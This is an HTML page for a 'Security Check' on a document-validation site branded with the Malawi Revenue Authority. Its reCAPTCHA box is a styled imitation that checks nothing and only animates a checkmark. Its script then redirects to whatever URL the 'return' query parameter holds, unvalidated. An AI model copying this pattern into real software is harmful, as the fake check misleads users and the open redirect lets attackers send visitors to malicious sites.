<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Check | Document Validation</title>
    <link href="../Content/css.css" rel="stylesheet"/>
    <script src="../bundles/modernizr.js"></script>
    <style>
        .rc-anchor {
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
            display: inline-block;
            height: 74px;
            width: 300px;
            margin: 20px 0;
            position: relative;
            cursor: pointer;
        }
        .rc-anchor:hover {
            border: 1px solid #b3b3b3;
        }
        .rc-anchor-content {
            display: flex;
            align-items: center;
            height: 100%;
            padding: 0 12px;
        }
        .rc-inline-block {
            display: inline-block;
        }
        .rc-anchor-checkbox-container {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-right: 12px;
            width: 28px;
            height: 28px;
            position: relative;
        }
        .rc-anchor-checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #c1c1c1;
            border-radius: 2px;
            background: #fff;
            cursor: pointer;
            margin: 0;
            display: block;
            box-sizing: border-box;
        }
        .rc-anchor-checkbox:checked {
            display: none;
        }
        
        /* The Checkmark - Refined to match image exactly */
        .rc-checkmark {
            display: none;
            width: 7px;
            height: 14px;
            border: solid #009a2d;
            border-width: 0 3px 3px 0;
            transform: rotate(45deg);
            position: absolute;
            left: 10px;
            top: 4px;
            box-sizing: border-box;
        }
        
        /* The Spinner */
        .rc-spinner {
            display: none;
            width: 24px;
            height: 24px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #4285f4;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            position: absolute;
            left: 2px;
            top: 2px;
            box-sizing: border-box;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .rc-anchor-text {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 14px;
            font-weight: 400;
            line-height: 17px;
            color: #000;
            cursor: pointer;
        }
        .rc-anchor-pt {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 8px;
            font-weight: 400;
            color: #555;
            margin-top: 2px;
        }
        .rc-anchor-pt a {
            color: #555;
            text-decoration: underline;
        }
        .rc-anchor-logo-portrait {
            position: absolute;
            right: 12px;
            top: 10px;
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 58px;
            text-align: center;
        }
        .rc-anchor-logo-img {
            width: 32px;
            height: 32px;
        }
        .rc-anchor-logo-text {
            font-family: Roboto, helvetica, arial, sans-serif;
            font-size: 10px;
            font-weight: 400;
            color: #9b9b9b;
            margin-top: 2px;
        }
        .btn-submit {
            background: #fff;
            border: 1px solid #000;
            color: #000;
            padding: 2px 15px;
            font-size: 14px;
            font-family: Arial, sans-serif;
            cursor: pointer;
            margin-top: 15px;
            display: inline-block;
            border-radius: 0px;
        }
        .btn-submit:hover {
            background: #eee;
        }
    </style>
</head>
<body>
    <div class="container body-content">
        <h2>Security Check</h2>
        <div id="error_msg" style="display:none; color: red; margin-bottom: 10px;">
            Please check the "I am not a robot" box to proceed.
        </div>
        <script>
            if (window.location.search.indexOf('error=1') > -1) {
                document.getElementById('error_msg').style.display = 'block';
            }
        </script>
        <div id="captcha-form">
            <p style="font-family: Arial, sans-serif; font-size: 14px; color: #333;">For security reasons, we need to verify that you are not a robot.</p>
            <div class="rc-anchor" onclick="handleCaptchaClick()">
                <div class="rc-anchor-content">
                    <div class="rc-anchor-checkbox-container">
                        <div id="custom-checkbox" class="rc-anchor-checkbox"></div>
                        <div id="spinner" class="rc-spinner"></div>
                        <div id="checkmark" class="rc-checkmark"></div>
                        <input type="checkbox" id="human_check" name="human_check" style="display:none;">
                    </div>
                    <div class="rc-inline-block">
                        <label class="rc-anchor-text">I'm not a robot</label>
                        <div class="rc-anchor-pt">
                            reCAPTCHA is changing its terms of service.<br>
                            <a href="#">Take action.</a>
                        </div>
                    </div>
                </div>
                <div class="rc-anchor-logo-portrait">
                    <img src="../../www.gstatic.com/recaptcha/recaptcha/api2/logo_48.png" alt="reCAPTCHA" class="rc-anchor-logo-img">
                    <div class="rc-anchor-logo-text">reCAPTCHA</div>
                </div>
            </div>
            <div id="submit-container" style="display:none;">
                <button type="button" class="btn-submit" onclick="redirectToGVC()">Submit</button>
            </div>
        </div>

        <script>
            function handleCaptchaClick() {
                var customCheckbox = document.getElementById('custom-checkbox');
                var realCheckbox = document.getElementById('human_check');
                var spinner = document.getElementById('spinner');
                var checkmark = document.getElementById('checkmark');
                var submitContainer = document.getElementById('submit-container');

                if (realCheckbox.checked) return; // Already checked

                // Show spinner
                customCheckbox.style.display = 'none';
                spinner.style.display = 'block';

                // Simulate validation delay
                setTimeout(function() {
                    spinner.style.display = 'none';
                    checkmark.style.display = 'block';
                    realCheckbox.checked = true;
                    
                    // Show submit button as requested
                    submitContainer.style.display = 'block';
                }, 1500);
            }

            function redirectToGVC() {
                // Set a session flag to indicate CAPTCHA is passed
                sessionStorage.setItem('captcha_passed', 'true');
                
                // Check if there's a return URL in the query parameters
                const urlParams = new URLSearchParams(window.location.search);
                const returnUrl = urlParams.get('return');
                
                if (returnUrl) {
                    // Redirect back to the original destination
                    window.location.href = returnUrl;
                } else {
                    // Default redirect if no return URL is specified
                    window.location.href = "gvc.html";
                }
            }
        </script>
    
        <hr />
        <footer>
            <p>&copy; 2026 - Malawi Revenue Authority</p>
        </footer>
    </div>

    <script src="../bundles/jquery.js"></script>
    <script src="../bundles/bootstrap.js"></script>
</body>
</html>
